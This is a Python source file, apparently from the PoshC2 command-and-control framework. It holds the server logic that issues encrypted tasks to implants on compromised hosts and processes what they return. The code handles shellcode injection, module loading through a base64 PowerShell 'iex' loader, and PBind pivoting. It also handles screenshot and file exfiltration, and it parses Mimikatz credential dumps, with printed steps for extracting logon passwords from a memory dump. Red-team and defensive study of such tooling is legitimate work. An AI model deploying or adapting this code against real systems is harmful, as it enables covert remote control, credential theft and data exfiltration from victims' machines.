import datetime, hashlib, base64, traceback, os, re

import poshc2.server.database.DB as DB
from poshc2.Colours import Colours
from poshc2.server.Config import ModulesDirectory, DownloadsDirectory, ReportsDirectory
from poshc2.server.Implant import Implant
from poshc2.server.Core import decrypt, encrypt, default_response, decrypt_bytes_gzip, number_of_days, process_mimikatz, print_bad
from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
from poshc2.server.payloads.Payloads import Payloads
from poshc2.server.PowerStatus import translate_power_status
from poshc2.Utils import randomuri

def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
    now = datetime.datetime.now()
    all_implants = DB.get_implants_all()
    if not all_implants:
        print_bad("Received post request but no implants in database... has the project been cleaned but you're using the same URLs?")
        return
    for implant in all_implants:
        implantID = implant.ImplantID
        RandomURI = implant.RandomURI
        Hostname = implant.Hostname
        encKey = implant.Key
        Domain = implant.Domain
        User = implant.User
        if RandomURI in uriPath and cookieVal:
            DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
            decCookie = decrypt(encKey, cookieVal)
            rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
            if decCookie.startswith("Error"):
                print(Colours.RED)
                print("The multicmd errored: ")
                print(rawoutput)
                print(Colours.GREEN)
                return

            cookieMsg = ""
            if "-" in decCookie:
                decCookie = decCookie.strip('\x00')
                splt = decCookie.split("-")
                if not splt[0].isdigit():
                    print(Colours.RED + "[!] Cookie %s is invalid" % decCookie + Colours.GREEN)
                    return
                else:
                    taskId = str(int(splt[0]))
                    cookieMsg = splt[1]
            else:
                taskId = str(int(decCookie.strip('\x00')))
            taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
            if taskId != "99999":
                executedCmd = DB.get_cmd_from_task_id(taskId)
                task_owner = DB.get_task_owner(taskId)
            else:
                print(Colours.END)
                timenow = now.strftime("%d/%m/%Y %H:%M:%S")
                print(f"Background task against implant {implantID} on host {Domain}\\{User} @ {Hostname} ({timenow}) (output appended to %sbackground-data.txt)" % ReportsDirectory)
                print(Colours.GREEN)
                print(rawoutput)
                miscData = open(("%sbackground-data.txt" % ReportsDirectory), "a+")
                miscData.write(rawoutput)
                return
            print(Colours.GREEN)
            if task_owner is not None:
                print("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
            else:
                print("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
            try:
                outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
                outputParsed = outputParsed.rstrip()
            except Exception:
                pass
            if cookieMsg is not None and cookieMsg.lower().startswith("pwrstatusmsg"):
                translate_power_status(outputParsed, RandomURI)
                return
            if "loadmodule" in executedCmd:
                print("Module loaded successfully")
                DB.update_task(taskId, "Module loaded successfully")
            elif "pbind-connect " in executedCmd and "PBind-Connected" in outputParsed:
                outputParsed = re.search("PBind-Connected:.*", outputParsed)
                outputParsed = outputParsed[0].replace("PBind-Connected: ", "")
                Domain, User, Hostname, Arch, PID, Proxy = str(outputParsed).split(";")
                Proxy = Proxy.replace("\x00", "")
                if "\\" in User:
                    User = User[User.index("\\") + 1:]
                newImplant = Implant(implantID, "C# PBind", str(Domain), str(User), str(Hostname), Arch, PID, None)
                newImplant.save()
                newImplant.display()
                newImplant.autoruns()
                DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
            elif executedCmd.lower().startswith("beacon "):
                new_sleep = executedCmd.replace('beacon ', '').strip()
                DB.update_sleep(new_sleep, RandomURI)
            elif "get-screenshot" in executedCmd.lower():
                try:
                    decoded = base64.b64decode(outputParsed)
                    filename = implant.User + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
                    output_file = open('%s%s.png' % (DownloadsDirectory, filename), 'wb')
                    print("Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
                    DB.update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
                    output_file.write(decoded)
                    output_file.close()
                except Exception:
                    DB.update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                    print("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
            elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
                DB.update_task(taskId, "Upload shellcode complete")
                print("Upload shellcode complete")
            elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")) or (executedCmd.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
                DB.update_task(taskId, "Upload shellcode complete")
                print(outputParsed)
            elif "download-file" in executedCmd.lower():
                try:
                    filename = executedCmd.lower().replace("download-files ", "")
                    filename = filename.replace("download-file ", "")
                    filename = filename.replace("-source ", "")
                    filename = filename.replace("..", "")
                    filename = filename.replace("'", "")
                    filename = filename.replace('"', "")
                    filename = filename.replace("\\", "/")
                    directory, filename = filename.rsplit('/', 1)
                    filename = filename.rstrip('\x00')
                    original_filename = filename.strip()

                    if not original_filename:
                        directory = directory.rstrip('\x00')
                        directory = directory.replace("/", "_").replace("\\", "_").strip()
                        original_filename = directory

                    try:
                        if rawoutput.startswith("Error"):
                            print("Error downloading file: ")
                            print(rawoutput)
                            break
                        chunkNumber = rawoutput[:5]
                        totalChunks = rawoutput[5:10]
                    except Exception:
                        chunkNumber = rawoutput[:5].decode("utf-8")
                        totalChunks = rawoutput[5:10].decode("utf-8")

                    if (chunkNumber == "00001") and os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
                        counter = 1
                        while(os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter)
                            counter += 1
                    if (chunkNumber != "00001"):
                        counter = 1
                        if not os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
                            print("Error trying to download part of a file to a file that does not exist: %s" % filename)
                        while(os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
                            # First find the 'next' file would be downloaded to
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter)
                            counter += 1
                        if counter != 2:
                            # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
                            if '.' in filename:
                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter - 2) + original_filename[original_filename.rfind('.'):]
                            else:
                                filename = original_filename + '-' + str(counter - 2)
                        else:
                            filename = original_filename
                    print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
                    DB.update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
                    output_file = open('%s%s' % (DownloadsDirectory, filename), 'ab')
                    try:
                        output_file.write(rawoutput[10:])
                    except Exception:
                        output_file.write(rawoutput[10:].encode("utf-8"))
                    output_file.close()
                except Exception as e:
                    DB.update_task(taskId, "Error downloading file %s " % e)
                    print("Error downloading file %s " % e)
                    traceback.print_exc()

            elif "safetydump" in executedCmd.lower():
                rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
                if rawoutput.startswith("[-]") or rawoutput.startswith("ErrorCmd"):
                    DB.update_task(taskId, rawoutput)
                    print(rawoutput)
                else:
                    dumpname = "SafetyDump-Task-%s.b64" % taskIdStr
                    dumppath = "%s%s" % (DownloadsDirectory, dumpname)
                    open(dumppath, 'w').write(rawoutput)
                    message = "Dump written to: %s" % dumppath
                    message = message + "\n The base64 blob needs decoding on Windows and then Mimikatz can be run against it."
                    message = message + "\n E.g:"
                    message = message + "\n     $filename = '.\\%s'" % dumpname
                    message = message + "\n     $b64 = Get-Content $filename"
                    message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + 'safetydump.dmp', $bytes)"
                    message = message + "\n     ./mimikatz.exe"
                    message = message + "\n     sekurlsa::minidump safetydump.dmp"
                    message = message + "\n     sekurlsa::logonpasswords"
                    DB.update_task(taskId, message)
                    print(message)

            elif (executedCmd.lower().startswith("run-exe safetykatz") or "invoke-mimikatz" in executedCmd or executedCmd.lower().startswith("pbind-command") or executedCmd.lower().startswith("run-dll sharpsploit")) and "logonpasswords" in outputParsed.lower():
                print("Parsing Mimikatz Output")
                DB.update_task(taskId, outputParsed)
                process_mimikatz(outputParsed)
                print(Colours.GREEN)
                print(outputParsed + Colours.END)

            else:
                DB.update_task(taskId, outputParsed)
                print(Colours.GREEN)
                print(outputParsed + Colours.END)


def newTask(path):
    all_implants = DB.get_implants_all()
    commands = ""
    if all_implants:
        for i in all_implants:
            RandomURI = i.RandomURI
            EncKey = i.Key
            tasks = DB.get_newtasks(RandomURI)
            if RandomURI in path and tasks:
                for task in tasks:
                    command = task[2]
                    user = task[3]
                    user_command = command
                    implant = DB.get_implantbyrandomuri(RandomURI)
                    implant_type = DB.get_implanttype(RandomURI)
                    now = datetime.datetime.now()
                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")  or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode")):
                        user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                        command = command[:command.index("#")]
                    elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file')):
                        PBind = False
                        if command.lower().startswith('pbind-command upload-file'):
                            PBind = True
                        upload_args = command \
                            .replace('pbind-command upload-file', '') \
                            .replace('upload-file', '')
                        upload_file = upload_args.split()[0]
                        try:
                            upload_file_destination = upload_args.split()[1]
                        except:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % upload_args)
                            print(Colours.GREEN)
                        upload_args = upload_args.replace(upload_file, '')
                        upload_args = upload_args.replace(upload_file_destination, '')
                        with open(upload_file, "rb") as f:
                            upload_file_bytes = f.read()
                        if not upload_file_bytes:
                            print(Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
                            DB.del_newtasks(str(task[0]))
                            continue
                        upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
                        if implant_type.lower().startswith('c#'):
                            command = f"upload-file {upload_file_bytes_b64};\"{upload_file_destination}\" {upload_args}"
                        elif implant_type.lower().startswith('ps'):
                            command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
                        elif implant_type.lower().startswith('py'):
                            command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
                        else:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % upload_args)
                            print(Colours.GREEN)
                        if PBind:
                            command = f"pbind-command {command}"
                        filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                        user_command = f"Uploading file: {upload_file} to {upload_file_destination} with md5sum: {filehash}"
                    taskId = DB.insert_task(RandomURI, user_command, user)
                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
                    if len(str(taskId)) > 5:
                        raise ValueError('Task ID is greater than 5 characters which is not supported.')
                    print(Colours.YELLOW)
                    if user is not None and user != "":
                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    else:
                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                    try:
                        if (user_command.lower().startswith("run-exe sharpwmi.program sharpwmi action=execute") or user_command.lower().startswith("pbind-command run-exe sharpwmi.program sharpwmi action=execute")):
                            print(user_command[0:200])
                            print("----TRUNCATED----")
                        else:
                            print(user_command)
                        print(Colours.END)
                    except Exception as e:
                        print("Cannot print output: %s" % e)
                    if task[2].startswith("loadmodule "):
                        try:
                            module_name = (task[2]).replace("loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                    elif task[2].startswith("run-exe Program PS "):
                        try:
                            cmd = (task[2]).replace("run-exe Program PS ", "")
                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
                            command = "run-exe Program PS %s" % modulestr
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pbind-command run-exe Program PS "):
                        try:
                            cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
                            command = "run-exe PBind PBind run-exe Program PS %s" % modulestr
                        except Exception as e:
                            print("Cannot base64 the command for PS")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pslo "):
                        try:
                            module_name = (task[2]).replace("pslo ", "")
                            for modname in os.listdir(ModulesDirectory):
                                if modname.lower() in module_name.lower():
                                    module_name = modname
                            modulestr = load_module_sharp(module_name)
                            command = "run-exe Program PS loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pbind-pslo"):
                        try:
                            module_name = (task[2]).replace("pbind-pslo ", "")
                            for modname in os.listdir(ModulesDirectory):
                                if modname.lower() in module_name.lower():
                                    module_name = modname
                            modulestr = load_module_sharp(module_name)
                            command = "run-exe PBind PBind \"run-exe Program PS loadmodule%s\"" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    elif task[2].startswith("pbind-loadmodule "):
                        try:
                            module_name = (task[2]).replace("pbind-loadmodule ", "")
                            if ".exe" in module_name:
                                for modname in os.listdir(ModulesDirectory):
                                    if modname.lower() in module_name.lower():
                                        module_name = modname
                                modulestr = load_module_sharp(module_name)
                                command = "run-exe PBind PBind \"loadmodule%s\"" % modulestr
                            elif ".dll" in module_name:
                                for modname in os.listdir(ModulesDirectory):
                                    if modname.lower() in module_name.lower():
                                        module_name = modname
                                modulestr = load_module_sharp(module_name)
                                command = "run-exe PBind PBind \"loadmodule%s\"" % modulestr
                            else:
                                for modname in os.listdir(ModulesDirectory):
                                    if modname.lower() in module_name.lower():
                                        module_name = modname
                                modulestr = load_module(module_name)
                                command = "run-exe PBind PBind \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()

                    elif task[2].startswith("pbind-command "):
                        command = command.replace("pbind-command ", "run-exe PBind PBind ")
                    elif task[2].startswith("pbind-connect"):
                        command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
                    elif task[2].startswith("pbind-kill"):
                        command = command.replace("pbind-kill", "run-exe PBind PBind kill")

                    # Uncomment to print actual commands that are being sent
                    # if "AAAAAAAAAAAAAAAAAAAA" not in command:
                    #     print(Colours.BLUE + "Issuing Command: " + command + Colours.GREEN)

                    command = taskIdStr + command
                    if commands:
                        commands += "!d-3dion@LD!-d" + command
                    else:
                        commands += command
                    DB.del_newtasks(str(task[0]))
                if commands is not None:
                    multicmd = "multicmd%s" % commands
                try:
                    responseVal = encrypt(EncKey, multicmd)
                except Exception as e:
                    responseVal = ""
                    print("Error encrypting value: %s" % e)
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return responseVal
            elif RandomURI in path and not tasks:
                # if there is no tasks but its a normal beacon send 200
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return default_response()
